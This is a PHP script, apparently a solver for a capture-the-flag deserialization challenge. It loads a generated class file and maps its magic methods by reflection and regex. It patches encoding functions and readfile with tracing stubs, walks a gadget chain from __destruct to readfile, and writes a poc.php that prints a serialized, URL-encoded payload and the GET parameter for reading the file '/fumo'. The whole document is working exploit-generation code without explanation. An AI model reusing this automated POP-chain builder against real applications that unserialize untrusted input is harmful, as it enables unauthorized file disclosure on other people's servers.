<?php
$input = "/fumo";

$match_start = "/_GET\['(.*)'\]/i";
$match_normal = 'this->([A-Za-z0-9]+)->([A-Za-z0-9]+)\(.*?\);';
$match_invoke = 'call_user_func\(\$this->([A-Za-z0-9]+), \[\'([A-Za-z0-9/=]+)\' => \$[A-Za-z0-9]+\]\)';
$match_call_next_method_name = 'extract\(\[\$name => \'([A-Za-z0-9]+)\'\]\);';
$match_call_last_method_name = 'call_user_func\(\[\$this->([A-Za-z0-9]+), \$([A-Za-z0-9]+)\], \.\.\.\$value\)';

$filename = "./test.php";
$data_list = file($filename);
$data = file_get_contents($filename);

$raw_class_len = count(get_declared_classes());
include_once("test.php");
$class_list = get_declared_classes();
$class_list = array_splice($class_list, $raw_class_len);
$start_class = "";

$method_list = [];
foreach ($class_list as $key => $class) {
    if (method_exists($class, "__call")) {
        $call_start_line = (new ReflectionClass($class))->getMethods()[0]->getStartLine();
        $call_code = $data_list[$call_start_line + 2];
        preg_match("~$match_call_last_method_name~", $call_code, $match);
        $method_list['__call'][$match[2]] = $class;
    } else if (method_exists($class, "__invoke")) {
        $call_start_line = (new ReflectionClass($class))->getMethods()[0]->getStartLine();
        $call_code = $data_list[$call_start_line];
        preg_match("/base64_decode\('([A-Za-z0-9\/=]+)'\)/im", $call_code, $match);
        $method_list['__invoke'][$match[1]] = $class;
    } else {
        $re_class = new ReflectionClass($class);
        $method_name = $re_class->getMethods()[0]->name;
        $method_list['normal'][$method_name] = $class;
        if (method_exists($class, "__destruct")) {
            $start_class = $class; 
        }
    }
}

preg_match_all(
    "~$match_normal~",
    $data, $matches_normal
);

preg_match_all(
    "~$match_invoke~",
    $data, $matches_invoke
);

preg_match_all(
    "~$match_call_next_method_name~",
    $data, $matches_next_call
);

preg_match_all(
    "~$match_call_last_method_name~",
    $data, $matches_last_call
);

function set_field($field_name, $class_name, $data) {
    $class_name = str_replace("christmasTree\\", "", $class_name);
    return str_replace("\$this->$field_name", "(\$this->$field_name = new $class_name)", $data);
}

if($matches_normal || $matches_invoke || $matches_call){
    foreach ($matches_normal[1] as $id => $field_name) {
        if (!empty($field_name)) {
            $class_name = $method_list['normal'][$matches_normal[2][$id]];

            if ($class_name !== null) {
                $data = set_field($field_name, $class_name, $data);
                continue;
            }

            $class_name = $method_list['__call'][$matches_normal[2][$id]];

            if ($class_name !== null) {
                $data = set_field($field_name, $class_name, $data);
                continue;
            }
        } else {
            continue;
        }
    }

    foreach ($matches_invoke[1] as $id => $field_name) {
        if (!empty($field_name)) {
            $invoke_key = base64_encode($matches_invoke[2][$id]);
            $class_name = $method_list['__invoke'][$invoke_key];
            if ($class_name !== null) {
                $invoke = new ReflectionMethod($class_name, '__invoke');
                $line_id = $invoke->getStartLine();
                if (strpos($data_list[$line_id], $invoke_key) !== false) {
                    $data = set_field($field_name, $class_name, $data);
                    continue;
                }
            }
        } else {
            continue;
        }
    }

    foreach ($matches_last_call[1] as $id => $field_name) {
        if (!empty($field_name)) {
            $class_name = $method_list['normal'][$matches_next_call[1][$id]];
            if ($class_name !== null) {
                $data = set_field($field_name, $class_name, $data);
                continue;
            }
        } else {
            continue;
        }
    }
}

$data = str_replace(
    ["str_rot13(", "ucfirst(", "strrev(", "readfile(", "base64_decode($"],
    ["fake_str_rot13(\$this,", "fake_ucfirst(\$this,", "fake_strrev(\$this,", "fake_readfile(\$this,", "fake_base64_decode(\$this,$"],
    $data
);

preg_match($match_start, $data, $start);
$get_expr = $start[0];
$get_value = $start[1];

$data = str_replace($get_expr, "input", $data);
$data = preg_replace("/function __destruct\(.*\)/i", "function start(\$input)", $data);

$data = str_replace(" \n    public object", " public static \$is_used = false;\n    public object", $data);
$data = str_replace(") {\n", ") {\n\t\tif (!self::\$is_used) self::\$is_used = true; else return;\n", $data);

file_put_contents("./test-copy.php", $data);

$code = <<<CODE
<?php
\$input = '$input';
\$list = [];
\$real_list = [];
\$start = null;

function fake_base64_decode(\$value, \$a) {
    global \$list;
    \$list[get_class(\$value)] = 'base64_encode';
    return \$a;
}

function fake_str_rot13(\$value, \$a) {
    global \$list;
    \$list[get_class(\$value)] = 'str_rot13';
    return \$a;
}

function fake_ucfirst(\$value, \$a) {
    global \$list;
    \$list[get_class(\$value)] = 'lcfirst';
    return \$a;
}

function fake_strrev(\$value, \$a) {
    global \$list;
    \$list[get_class(\$value)] = 'strrev';
    return \$a;
}

function fake_readfile(\$value, \$a) {
    global \$input;
    global \$real_list;
    global \$list;
    global \$start;

    if (!empty(\$a) && is_string(\$a) && strpos(\$input, \$a) !== false) {
        \$last_class = new stdClass;
        foreach (debug_backtrace() as \$stack) {
            \$real_list[] = \$list[\$stack['class']];

            if (\$stack['class'] !== NULL) {
                \$start = new \$stack['class'];
                foreach (get_class_vars(\$stack['class']) as \$field => \$_) {
                    \$start->\$field = \$last_class;
                }
                \$last_class = \$start;
            }
        }
    }
}

include "./test-copy.php";
(new $start_class)->start(\$input);

\$real_value = \$input;
foreach (\$real_list as \$function) {
    if (\$function !== NULL) {
        \$real_value = \$function(\$real_value);
    }
}

var_dump(serialize(\$start));
var_dump(urlencode(serialize(\$start)));
var_dump("$get_value=".\$real_value);
CODE;

file_put_contents("poc.php", $code);

